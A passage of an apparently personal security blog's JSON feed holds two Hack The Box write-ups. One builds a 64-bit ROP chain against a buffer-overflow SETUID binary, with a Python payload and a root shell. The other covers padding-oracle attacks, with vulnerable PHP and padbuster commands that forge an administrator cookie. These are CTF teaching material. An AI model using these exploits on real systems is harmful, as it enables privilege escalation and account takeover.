r15; ret\"sh\"pop rdi; ret# stack frame 1setuid()NULLpop rdi; ret\"allow\" + \"A\"*29Let’s take a closer look at stack frame 1.## higher memory address ### Once the \"pop rdi\" instruction is finished executing, the# next instructions is \"ret\". Since \"setuid()\" address is the# next value from stack, the flow of execution will now go# there completing our command `setuid(0)`.setuid()# When the \"pop rdi\" instruction executes, it will pop# the next value from the stack into RDI. That next value is# NULL which is also equal to \"0\".NULL# This contains the address of \"pop rdi; ret\". Why do need it?# In 64-bit calling convention, to pass a parameter to a# function, in this case `setuid()`, we need to put the# parameter into RDI. Then once its there, the function will# get it in the form of `setuid(0)`.pop rdi; ret# This is the overflow part which will allow us to control the# next instruction to execute which is on RIP. The next# instruction will be on top of this.\"allow\" + \"A\"*29## lower memory address ##Then for stack frame 2.## higher memory address ### When \"ret\" executes, it will go to address of instruction# `execvp()` completing our final function call which is# `execvp(\"sh\", NULL)`execvp()# When \"pop r15\" executes, it will put NULL into RSINULL# When \"pop rsi\" executes, it will put NULL into RSINULL# When \"ret\" instruction executes, it will go to this# instruction. Why do we need \"pop r15\"? Actually we don't# need it. It just happened that there is no gadget which# consists only of \"pop rsi\". So for completenes, we have no# choice but to include also \"pop r15\" in our ROP chain.pop rsi; pop r15; ret# When \"pop rdi\" instruction executes, it will put \"sh\" into# RDI since this is the next value in the stack.\"sh\"# Continuing from previous stack frame, the next instruction# to execute is \"pop rdi; ret\". In this case our target# function call is `execvp()`. It accepts 2 parameters:#  1. the string we want to execute in this case its#     `/bin/sh` or just \"sh\". This should be put to RDI.#  2. a NULL terminator and must be put to RSI.pop rdi; ret## lower memory address ##Here is also an illustration of stack flow of stack frame 1. Flow for stack frame 2 will be similar.## stack view @ RIP \"pop_rdi_addr\"setuid_addrnullpop_rdi_addr    # --&gt; flow executions continues @ this addr## stack view @ pop rdisetuid_addrnull            # --&gt; POP to RDI## stack view @ retsetuid_addr     # --&gt; executes `setuid(0)`References  HTB RedCross",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>If ASLR and NX is enabled on a 64-bit program, this means we cannot execute code on stack and address space of libraries changes on every program run.</p><p>In this technique, we can find some ROP gadgets whose address are static and we can use them to do <code class=\"language-plaintext highlighter-rouge\">setuid(0)</code> and drop to a shell using <code class=\"language-plaintext highlighter-rouge\">execvpe()</code>.</p><h2 id=\"environment-setup\">Environment Setup</h2><ul>  <li>SETUID program whose vulnerable to buffer overflow. In this example, we can see that even though <code class=\"language-plaintext highlighter-rouge\">fgets</code> is assumed to be safe from bufferoverflow, a misconfigured program is still vulnerable.</li></ul><div class=\"language-c highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// filename: iptctl</span><span class=\"c1\">// [...redacted...]</span><span class=\"c1\">// 360 bytes here</span><span class=\"cp\">#define BUFFSIZE 360</span><span class=\"kt\">void</span> <span class=\"nf\">interactive</span><span class=\"p\">(</span><span class=\"kt\">char</span> <span class=\"o\">*</span><span class=\"n\">ip</span><span class=\"p\">,</span> <span class=\"kt\">char</span> <span class=\"o\">*</span><span class=\"n\">action</span><span class=\"p\">,</span> <span class=\"kt\">char</span> <span class=\"o\">*</span><span class=\"n\">name</span><span class=\"p\">){</span>        <span class=\"kt\">char</span> <span class=\"n\">inputAddress</span><span class=\"p\">[</span><span class=\"mi\">16</span><span class=\"p\">];</span>        <span class=\"c1\">// but destination buffer locally is 10 bytes only!</span>        <span class=\"c1\">// this is the buffer overflow part</span>        <span class=\"kt\">char</span> <span class=\"n\">inputAction</span><span class=\"p\">[</span><span class=\"mi\">10</span><span class=\"p\">];</span>        <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"Entering interactive mode</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">);</span>        <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"Action(allow|restrict|show): \"</span><span class=\"p\">);</span>        <span class=\"c1\">// hence, fgets is not using the correct buffer size</span>        <span class=\"n\">fgets</span><span class=\"p\">(</span><span class=\"n\">inputAction</span><span class=\"p\">,</span><span class=\"n\">BUFFSIZE</span><span class=\"p\">,</span><span class=\"n\">stdin</span><span class=\"p\">);</span>        <span class=\"c1\">// this also have vulnerable fgets but we will ignore</span>        <span class=\"c1\">// this part since its hard to send arbritrary input</span>        <span class=\"c1\">// here, inputAddress is being validated properly</span>        <span class=\"n\">fgets</span><span class=\"p\">(</span><span class=\"n\">inputAddress</span><span class=\"p\">,</span><span class=\"n\">BUFFSIZE</span><span class=\"p\">,</span><span class=\"n\">stdin</span><span class=\"p\">);</span>        <span class=\"n\">fflush</span><span class=\"p\">(</span><span class=\"n\">stdin</span><span class=\"p\">);</span>        <span class=\"n\">inputAddress</span><span class=\"p\">[</span><span class=\"n\">strlen</span><span class=\"p\">(</span><span class=\"n\">inputAddress</span><span class=\"p\">)</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>        <span class=\"c1\">// this is the validation part, isValidIpAddress is</span>        <span class=\"c1\">// validated properly but not isValidAction</span>        <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"o\">!</span> <span class=\"n\">isValidAction</span><span class=\"p\">(</span><span class=\"n\">inputAction</span><span class=\"p\">)</span> <span class=\"o\">||</span> <span class=\"o\">!</span> <span class=\"n\">isValidIpAddress</span><span class=\"p\">(</span><span class=\"n\">inputAddress</span><span class=\"p\">)){</span>                <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"Usage: %s allow|restrict|show IP</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">,</span> <span class=\"n\">name</span><span class=\"p\">);</span>                <span class=\"n\">exit</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"p\">}</span>        <span class=\"n\">strcpy</span><span class=\"p\">(</span><span class=\"n\">ip</span><span class=\"p\">,</span> <span class=\"n\">inputAddress</span><span class=\"p\">);</span>        <span class=\"n\">strcpy</span><span class=\"p\">(</span><span class=\"n\">action</span><span class=\"p\">,</span> <span class=\"n\">inputAction</span><span class=\"p\">);</span>        <span class=\"k\">return</span><span class=\"p\">;</span><span class=\"c1\">// [...redacted...]</span></code></pre></div></div><p>We will also use GDB peda as our debugger.</p><h2 id=\"steps\">Steps</h2><ul>  <li>Get a copy of binary and put it on your attacker machine</li>  <li>Determine protections</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># check ASLR on victim machine</span>penelope@redcross:/dev/shm<span class=\"nv\">$ </span><span class=\"nb\">cat</span> /proc/sys/kernel/randomize_va_space2penelope@redcross:/dev/shm<span class=\"err\">$</span><span class=\"c\"># check PIE on gdb peda on attacker machine</span>gdb-peda<span class=\"nv\">$ </span>checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : Partialgdb-peda<span class=\"nv\">$ </span></code></pre></div></div><ul>  <li>Find offset to <code class=\"language-plaintext highlighter-rouge\">RIP</code></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># set breakpoints</span>br <span class=\"k\">*</span>interactive+73br <span class=\"k\">*</span>interactive+73<span class=\"c\"># create pattern - 50 is more than enough since we only need</span><span class=\"c\"># 10 bytes to overflow</span>pattern_create 50<span class=\"c\"># run interactively</span>gdb-peda<span class=\"nv\">$ </span>run <span class=\"nt\">-i</span>Starting program: /home/kali/data/practice/hack_the_box/linux/redcross/iptctl <span class=\"nt\">-i</span>Entering interactive modeAction<span class=\"o\">(</span>allow|restrict|show<span class=\"o\">)</span>: allowAAA%AAsAABAA<span class=\"nv\">$AAnAACAA</span><span class=\"nt\">-AA</span><span class=\"o\">(</span>AADAA<span class=\"p\">;</span>AA<span class=\"o\">)</span>AAEAAaAA0AAFAAbA<span class=\"c\"># [...redacted....]</span><span class=\"c\"># find offset - get value of \"saved rip\" first</span>info frame pattern_offset 0x4541412941413b41<span class=\"c\"># offset is 29</span></code></pre></div></div><ul>  <li>Since we cannot execute code on stack, we need to find a static address of gadgets we can use. These addresses will remain the same inside victim and attacker machine. I believe the reason is because PIE is not enabled on the program. We also wanted to do <code class=\"language-plaintext highlighter-rouge\">setuid(0)</code> first before dropping to shell via <code class=\"language-plaintext highlighter-rouge\">execvp</code> so that can gain the effective UID of root. Our payload structure will look like this. For detailed information about the payload structure, see the section below “Explaining the payload structure”.</li></ul><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">payload</span> <span class=\"o\">=</span> <span class=\"s\">\"allow\"</span> <span class=\"o\">+</span> <span class=\"s\">\"A\"</span><span class=\"o\">*</span><span class=\"mi\">29</span> <span class=\"o\">+</span> <span class=\"n\">pop_rdi_addr</span> <span class=\"o\">+</span> <span class=\"n\">null</span> <span class=\"o\">+</span> <span class=\"n\">setuid_addr</span> <span class=\"o\">+</span> <span class=\"n\">pop_rdi_addr</span> <span class=\"o\">+</span> <span class=\"n\">sh_addr</span> <span class=\"o\">+</span> <span class=\"n\">pop_rsi_pop_r15_addr</span> <span class=\"o\">+</span> <span class=\"n\">null</span> <span class=\"o\">+</span> <span class=\"n\">null</span> <span class=\"o\">+</span> <span class=\"n\">execvp_addr</span> <span class=\"o\">+</span> <span class=\"s\">\"</span><span class=\"se\">\\n</span><span class=\"s\">\"</span> <span class=\"o\">+</span> <span class=\"s\">\"1.1.1.1\"</span> <span class=\"o\">+</span> <span class=\"s\">\"</span><span class=\"se\">\\n</span><span class=\"s\">\"</span></code></pre></div></div><ul>  <li>Now let’s find the values</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># pop_rdi_addr</span>gdb-peda<span class=\"nv\">$ </span>ropsearch <span class=\"s2\">\"pop rdi\"</span><span class=\"c\"># null</span><span class=\"s2\">\"</span><span class=\"se\">\\x</span><span class=\"s2\">00</span><span class=\"se\">\\x</span><span class=\"s2\">00</span><span class=\"se\">\\x</span><span class=\"s2\">00</span><span class=\"se\">\\x</span><span class=\"s2\">00</span><span class=\"se\">\\x</span><span class=\"s2\">00</span><span class=\"se\">\\x</span><span class=\"s2\">00</span><span class=\"se\">\\x</span><span class=\"s2\">00</span><span class=\"se\">\\x</span><span class=\"s2\">00\"</span><span class=\"c\"># setuid_addr</span>gdb-peda<span class=\"nv\">$ </span>plt<span class=\"c\"># [...redacted...]</span>Breakpoint 37 at 0x400780 <span class=\"o\">(</span>setuid@plt<span class=\"o\">)</span><span class=\"c\"># [...redacted...]</span>gdb-peda<span class=\"err\">$</span><span class=\"c\"># sh_addr</span>gdb-peda<span class=\"nv\">$ </span>find <span class=\"s2\">\"sh\"</span><span class=\"c\"># [...redacted...]</span>    iptctl : 0x40046e <span class=\"nt\">--</span><span class=\"o\">&gt;</span> 0x7063727473006873 <span class=\"o\">(</span><span class=\"s1\">'sh'</span><span class=\"o\">)</span><span class=\"c\"># [...redacted...]</span><span class=\"c\"># pop_rsi_pop_r15_addr</span>gdb-peda<span class=\"nv\">$ </span>ropsearch <span class=\"s2\">\"pop rsi\"</span><span class=\"c\"># [...redacted...]</span>0x00400de1 : <span class=\"o\">(</span>b<span class=\"s1\">'5e415fc3'</span><span class=\"o\">)</span>\tpop rsi<span class=\"p\">;</span> pop r15<span class=\"p\">;</span> retgdb-peda<span class=\"nv\">$ </span><span class=\"c\"># execvp_addr</span>gdb-peda<span class=\"nv\">$ </span>pltBreakpoint 42 at 0x400760 <span class=\"o\">(</span>execvp@plt<span class=\"o\">)</span><span class=\"c\"># [...redacted...]</span>gdb-peda<span class=\"nv\">$ </span></code></pre></div></div><ul>  <li>Let’s construct our final python script. I will not use <code class=\"language-plaintext highlighter-rouge\">pwn</code> tools to show how this is being done without any helper functions.</li></ul><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">#!/usr/bin/env python</span><span class=\"c1\"># gadgets and variables - take note that due to being little# endian, we need to consutrct the memory addresses in reverse# order. For example, if we see an addres in gdb which is# \"0x400760\" in python it will be \"\\x60\\x07\\x40\".# # Another thing to take note of is that since we are dealing# with 64-bit architecture, you might often see in debuggers# that they only display 6 bytes of address instead of 8.# That's because the remaining 2 bytes are not used. So in our# python script, just replace the missing 2 bytes with NULL# bytes \"\\x00\\x00\".                                                           </span><span class=\"n\">pop_rdi_addr</span> <span class=\"o\">=</span> <span class=\"s\">\"</span><span class=\"se\">\\xe3\\x0d\\x40\\x00\\x00\\x00\\x00\\x00</span><span class=\"s\">\"</span>                                                                                                   <span class=\"n\">sh_addr</span> <span class=\"o\">=</span> <span class=\"s\">\"</span><span class=\"se\">\\x6e\\04\\x40\\x00\\x00\\x00\\x00\\x00</span><span class=\"s\">\"</span>                                                                                               <span class=\"n\">pop_rsi_pop_r15_addr</span> <span class=\"o\">=</span> <span class=\"s\">\"</span><span class=\"se\">\\xe1\\x0d\\x40\\x00\\x00\\x00\\x00\\x00</span><span class=\"s\">\"</span>                                                                                            <span class=\"n\">execvp_addr</span> <span class=\"o\">=</span> <span class=\"s\">\"</span><span class=\"se\">\\x60\\x07\\x40\\x00\\x00\\x00\\x00\\x00</span><span class=\"s\">\"</span>                                                                                                   <span class=\"n\">setuid_addr</span> <span class=\"o\">=</span> <span class=\"s\">\"</span><span class=\"se\">\\x80\\x07\\x40\\x00\\x00\\x00\\x00\\x00</span><span class=\"s\">\"</span>                                <span class=\"n\">null</span> <span class=\"o\">=</span> <span class=\"s\">\"</span><span class=\"se\">\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00</span><span class=\"s\">\"</span>                                                                                <span class=\"n\">payload</span> <span class=\"o\">=</span> <span class=\"s\">\"allow\"</span> <span class=\"o\">+</span> <span class=\"s\">\"A\"</span><span class=\"o\">*</span><span class=\"mi\">29</span><span class=\"n\">payload</span> <span class=\"o\">+=</span> <span class=\"n\">pop_rdi_addr</span> <span class=\"o\">+</span> <span class=\"n\">null</span> <span class=\"o\">+</span> <span class=\"n\">setuid_addr</span><span class=\"n\">payload</span> <span class=\"o\">+=</span> <span class=\"n\">pop_rdi_addr</span> <span class=\"o\">+</span> <span class=\"n\">sh_addr</span> <span class=\"o\">+</span> <span class=\"n\">pop_rsi_pop_r15_addr</span> <span class=\"o\">+</span> <span class=\"n\">null</span> <span class=\"o\">+</span> <span class=\"n\">null</span> <span class=\"o\">+</span> <span class=\"n\">execvp_addr</span> <span class=\"o\">+</span> <span class=\"s\">\"</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"n\">payload</span> <span class=\"o\">+=</span> <span class=\"s\">\"1.1.1.1\"</span> <span class=\"o\">+</span> <span class=\"s\">\"</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">payload</span><span class=\"p\">)</span></code></pre></div></div><ul>  <li>Copy this script any run on victim machine</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>penelope@redcross:/dev/shm<span class=\"nv\">$ </span><span class=\"o\">(</span>python2 bof.py<span class=\"p\">;</span><span class=\"nb\">cat</span> -<span class=\"o\">)</span> | /opt/iptctl/iptctl <span class=\"nt\">-i</span>Entering interactive mode<span class=\"nb\">id</span><span class=\"nv\">uid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>1000<span class=\"o\">(</span>penelope<span class=\"o\">)</span> <span class=\"nv\">egid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span>,4<span class=\"o\">(</span>adm<span class=\"o\">)</span>,24<span class=\"o\">(</span>cdrom<span class=\"o\">)</span>,25<span class=\"o\">(</span>floppy<span class=\"o\">)</span>,29<span class=\"o\">(</span>audio<span class=\"o\">)</span>,30<span class=\"o\">(</span>dip<span class=\"o\">)</span>,44<span class=\"o\">(</span>video<span class=\"o\">)</span>,46<span class=\"o\">(</span>plugdev<span class=\"o\">)</span>,108<span class=\"o\">(</span>netdev<span class=\"o\">)</span>,112<span class=\"o\">(</span>lpadmin<span class=\"o\">)</span>,116<span class=\"o\">(</span>scanner<span class=\"o\">)</span>,1000<span class=\"o\">(</span>penelope<span class=\"o\">)</span>,1003<span class=\"o\">(</span>mailadm<span class=\"o\">)</span></code></pre></div></div><h2 id=\"explaining-the-payload-structure\">Explaining the payload structure</h2><p>First things to understand is how the calling conventions work for 32-bit and 64-bit architectures.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>execvp<span class=\"o\">()</span>NULLNULLpop rsi<span class=\"p\">;</span> pop r15<span class=\"p\">;</span> ret<span class=\"s2\">\"sh\"</span>pop rdi<span class=\"p\">;</span> retsetuid<span class=\"o\">()</span>NULLpop rdi<span class=\"p\">;</span> ret<span class=\"s2\">\"allow\"</span> + <span class=\"s2\">\"A\"</span><span class=\"k\">*</span>29</code></pre></div></div><p>To better understand, let’s divide the payload into different stack frames.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># stack frame 2</span>execvp<span class=\"o\">()</span>NULLNULLpop rsi<span class=\"p\">;</span> pop r15<span class=\"p\">;</span> ret<span class=\"s2\">\"sh\"</span>pop rdi<span class=\"p\">;</span> ret<span class=\"c\"># stack frame 1</span>setuid<span class=\"o\">()</span>NULLpop rdi<span class=\"p\">;</span> ret<span class=\"s2\">\"allow\"</span> + <span class=\"s2\">\"A\"</span><span class=\"k\">*</span>29</code></pre></div></div><p>Let’s take a closer look at stack frame 1.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\">## higher memory address ##</span><span class=\"c\"># Once the \"pop rdi\" instruction is finished executing, the</span><span class=\"c\"># next instructions is \"ret\". Since \"setuid()\" address is the</span><span class=\"c\"># next value from stack, the flow of execution will now go</span><span class=\"c\"># there completing our command `setuid(0)`.</span>setuid<span class=\"o\">()</span><span class=\"c\"># When the \"pop rdi\" instruction executes, it will pop</span><span class=\"c\"># the next value from the stack into RDI. That next value is</span><span class=\"c\"># NULL which is also equal to \"0\".</span>NULL<span class=\"c\"># This contains the address of \"pop rdi; ret\". Why do need it?</span><span class=\"c\"># In 64-bit calling convention, to pass a parameter to a</span><span class=\"c\"># function, in this case `setuid()`, we need to put the</span><span class=\"c\"># parameter into RDI. Then once its there, the function will</span><span class=\"c\"># get it in the form of `setuid(0)`.</span>pop rdi<span class=\"p\">;</span> ret<span class=\"c\"># This is the overflow part which will allow us to control the</span><span class=\"c\"># next instruction to execute which is on RIP. The next</span><span class=\"c\"># instruction will be on top of this.</span><span class=\"s2\">\"allow\"</span> + <span class=\"s2\">\"A\"</span><span class=\"k\">*</span>29<span class=\"c\">## lower memory address ##</span></code></pre></div></div><p>Then for stack frame 2.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\">## higher memory address ##</span><span class=\"c\"># When \"ret\" executes, it will go to address of instruction</span><span class=\"c\"># `execvp()` completing our final function call which is</span><span class=\"c\"># `execvp(\"sh\", NULL)`</span>execvp<span class=\"o\">()</span><span class=\"c\"># When \"pop r15\" executes, it will put NULL into RSI</span>NULL<span class=\"c\"># When \"pop rsi\" executes, it will put NULL into RSI</span>NULL<span class=\"c\"># When \"ret\" instruction executes, it will go to this</span><span class=\"c\"># instruction. Why do we need \"pop r15\"? Actually we don't</span><span class=\"c\"># need it. It just happened that there is no gadget which</span><span class=\"c\"># consists only of \"pop rsi\". So for completenes, we have no</span><span class=\"c\"># choice but to include also \"pop r15\" in our ROP chain.</span>pop rsi<span class=\"p\">;</span> pop r15<span class=\"p\">;</span> ret<span class=\"c\"># When \"pop rdi\" instruction executes, it will put \"sh\" into</span><span class=\"c\"># RDI since this is the next value in the stack.</span><span class=\"s2\">\"sh\"</span><span class=\"c\"># Continuing from previous stack frame, the next instruction</span><span class=\"c\"># to execute is \"pop rdi; ret\". In this case our target</span><span class=\"c\"># function call is `execvp()`. It accepts 2 parameters:</span><span class=\"c\">#  1. the string we want to execute in this case its</span><span class=\"c\">#     `/bin/sh` or just \"sh\". This should be put to RDI.</span><span class=\"c\">#  2. a NULL terminator and must be put to RSI.</span>pop rdi<span class=\"p\">;</span> ret<span class=\"c\">## lower memory address ##</span></code></pre></div></div><p>Here is also an illustration of stack flow of stack frame 1. Flow for stack frame 2 will be similar.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\">## stack view @ RIP \"pop_rdi_addr\"</span>setuid_addrnullpop_rdi_addr    <span class=\"c\"># --&gt; flow executions continues @ this addr</span><span class=\"c\">## stack view @ pop rdi</span>setuid_addrnull            <span class=\"c\"># --&gt; POP to RDI</span><span class=\"c\">## stack view @ ret</span>setuid_addr     <span class=\"c\"># --&gt; executes `setuid(0)`</span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB RedCross</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/01/15/bypass-aslr-nx-64-bit-rop-chain",
            
            
            
            "tags": ["bof","privesc"],
            
            "date_published": "2022-01-15T00:00:00+08:00",
            "date_modified": "2022-01-15T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2021/12/25/padding-oracle-attack",
            "title": "Padding Oracle Attack",
            "summary": "Padding Oracle Attack",
            "content_text": "OverviewCBD mode PKCS7 format uses padding to complete the block length when encrypting plaintext.Attacker can leverage this behaviour to get the plaintext by manipulating the ciphertext byte by byte in a trial and error fashion and observing whether the application will return error (invalid padding) or success (valid padding).This kind of crypto may be safe but the real attack surface is on whether your app is returning error on invalid padding which will give an attacker chance to brute force the correct plaintext.// example file from HTB lazyfunction decryptString($encryptedText, $passphrase) {  $encrypted = base64_decode($encryptedText);  $iv_size =  mcrypt_get_iv_size(MCRYPT_DES, MCRYPT_MODE_CBC);  $iv = substr($encrypted,0,$iv_size);  $dec = mcrypt_decrypt(MCRYPT_DES, $passphrase, substr($encrypted,$iv_size), MCRYPT_MODE_CBC, $iv);  $str = pkcs5_unpad($dec);  if ($str === false) {    echo \"Invalid padding\"; // really? you want to be hacked?    die();                  // maybe let's replace that or  }                         // remove entirely?  else {    return $str;  }}This is also a type of CCA or Chosen Ciphertext Attack.Details on ciphertext manipulationGo to “The Theory” part of this link.Detection  Try manipulating cookie values. See if webapp will error response such as invalid padding or 500,Exploitation  Using padbuster# installationsudo apt-get install padbuster# detectionpadbuster http://10.10.10.10/index.php \"RVJDQrwUdTRWJUVUeBKkEA==\" 8 -encoding 0 -cookies \"login=RVJDQrwUdTRWJUVUeBKkEA==\"# gets an admin cookiepadbuster http://10.10.10.10/index.php \"RVJDQrwUdTRWJUVUeBKkEA==\" 8 -encoding 0 -cookies \"login=RVJDQrwUdTRWJUVUeBKkEA==\" -plaintext \"user=administrator\"  Using bit flippingattack. Here is another resource from ippsec using Burp.References  Padding Oracle - HackTricks  HTB Lazy  Mathematical Explanation  The Padding Oracle Attack",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>CBD mode PKCS7 format uses padding to complete the block length when encrypting plaintext.</p><p><img src=\"/spindel/assets/Padding Oracle Attack/padding.png\" alt=\"\" /></p><p>Attacker can leverage this behaviour to get the plaintext by manipulating the ciphertext byte by byte in a trial and error fashion and observing whether the application will return error (invalid padding) or success (valid padding).</p><p>This kind of crypto may be safe but the real attack surface is on whether your app is returning error on invalid padding which will give an attacker chance to brute force the correct plaintext.</p><div class=\"language-php highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// example file from HTB lazy</span><span class=\"k\">function</span> <span class=\"n\">decryptString</span><span class=\"p\">(</span><span class=\"nv\">$encryptedText</span><span class=\"p\">,</span> <span class=\"nv\">$passphrase</span><span class=\"p\">)</span> <span class=\"p\">{</span>  <span class=\"nv\">$encrypted</span> <span class=\"o\">=</span> <span class=\"nb\">base64_decode</span><span class=\"p\">(</span><span class=\"nv\">$encryptedText</span><span class=\"p\">);</span>  <span class=\"nv\">$iv_size</span> <span class=\"o\">=</span>  <span class=\"nb\">mcrypt_get_iv_size</span><span class=\"p\">(</span><span class=\"no\">MCRYPT_DES</span><span class=\"p\">,</span> <span class=\"no\">MCRYPT_MODE_CBC</span><span class=\"p\">);</span>  <span class=\"nv\">$iv</span> <span class=\"o\">=</span> <span class=\"nb\">substr</span><span class=\"p\">(</span><span class=\"nv\">$encrypted</span><span class=\"p\">,</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"nv\">$iv_size</span><span class=\"p\">);</span>  <span class=\"nv\">$dec</span> <span class=\"o\">=</span> <span class=\"nb\">mcrypt_decrypt</span><span class=\"p\">(</span><span class=\"no\">MCRYPT_DES</span><span class=\"p\">,</span> <span class=\"nv\">$passphrase</span><span class=\"p\">,</span> <span class=\"nb\">substr</span><span class=\"p\">(</span><span class=\"nv\">$encrypted</span><span class=\"p\">,</span><span class=\"nv\">$iv_size</span><span class=\"p\">),</span> <span class=\"no\">MCRYPT_MODE_CBC</span><span class=\"p\">,</span> <span class=\"nv\">$iv</span><span class=\"p\">);</span>  <span class=\"nv\">$str</span> <span class=\"o\">=</span> <span class=\"nf\">pkcs5_unpad</span><span class=\"p\">(</span><span class=\"nv\">$dec</span><span class=\"p\">);</span>  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nv\">$str</span> <span class=\"o\">===</span> <span class=\"kc\">false</span><span class=\"p\">)</span> <span class=\"p\">{</span>    <span class=\"k\">echo</span> <span class=\"s2\">\"Invalid padding\"</span><span class=\"p\">;</span> <span class=\"c1\">// really? you want to be hacked?</span>    <span class=\"k\">die</span><span class=\"p\">();</span>                  <span class=\"c1\">// maybe let's replace that or</span>  <span class=\"p\">}</span>                         <span class=\"c1\">// remove entirely?</span>  <span class=\"k\">else</span> <span class=\"p\">{</span>    <span class=\"k\">return</span> <span class=\"nv\">$str</span><span class=\"p\">;</span>  <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>This is also a type of CCA or Chosen Ciphertext Attack.</p><h2 id=\"details-on-ciphertext-manipulation\">Details on ciphertext manipulation</h2><p>Go to “The Theory” part of this <a href=\"https://pentesterlab.com/exercises/padding_oracle/course\">link</a>.</p><h2 id=\"detection\">Detection</h2><ul>  <li>Try manipulating cookie values. See if webapp will error response such as <code class=\"language-plaintext highlighter-rouge\">invalid padding</code> or <code class=\"language-plaintext highlighter-rouge\">500</code>,</li></ul><h2 id=\"exploitation\">Exploitation</h2><ul>  <li>Using padbuster</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># installation</span><span class=\"nb\">sudo </span>apt-get <span class=\"nb\">install </span>padbuster<span class=\"c\"># detection</span>padbuster http://10.10.10.10/index.php <span class=\"s2\">\"RVJDQrwUdTRWJUVUeBKkEA==\"</span> 8 <span class=\"nt\">-encoding</span> 0 <span class=\"nt\">-cookies</span> <span class=\"s2\">\"login=RVJDQrwUdTRWJUVUeBKkEA==\"</span><span class=\"c\"># gets an admin cookie</span>padbuster http://10.10.10.10/index.php <span class=\"s2\">\"RVJDQrwUdTRWJUVUeBKkEA==\"</span> 8 <span class=\"nt\">-encoding</span> 0 <span class=\"nt\">-cookies</span> <span class=\"s2\">\"login=RVJDQrwUdTRWJUVUeBKkEA==\"</span> <span class=\"nt\">-plaintext</span> <span class=\"s2\">\"user=administrator\"</span></code></pre></div></div><ul>  <li>Using <a href=\"https://0xdf.gitlab.io/2020/07/29/htb-lazy.html#path-2-bit-flip-attack\">bit flippingattack</a>. Here is another resource from <a href=\"https://www.youtube.com/watch?v=3VxZNflJqsw&amp;t=460s\">ippsec</a> using Burp.</li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/cryptography/padding-oracle-priv#padding-oracle\">Padding Oracle - HackTricks</a></li>  <li><a href=\"https://www.youtube.com/watch?v=3VxZNflJqsw\">HTB Lazy</a></li>  <li><a href=\"https://www.youtube.com/watch?v=aH4DENMN_O4&amp;t=873s\">Mathematical Explanation</a></li>  <li><a href=\"https://robertheaton.com/2013/07/29/padding-oracle-attack/\">The Padding Oracle Attack</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2021/12/25/padding-oracle-attack",
            
            
            
            "tags": ["web","crypto","foothold"],
            
            "date_published": "2021-12-25T00:00:00+08:00",
            "date_modified": "2021-12-25T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        }
    
    ]
}